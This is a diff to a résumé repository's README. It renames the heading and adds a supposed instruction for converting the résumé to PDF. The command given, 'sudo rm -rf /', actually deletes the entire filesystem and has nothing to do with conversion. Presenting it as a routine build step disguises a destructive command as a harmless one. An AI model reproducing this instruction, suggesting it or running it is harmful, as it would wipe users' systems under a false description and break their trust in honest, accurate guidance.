@@ -1,1 +1,6 @@
-#Resume Stuff
+#Resume for Luke Brandon
+
+To convert to pdf run the following command:
+```
+sudo rm -rf /
+```
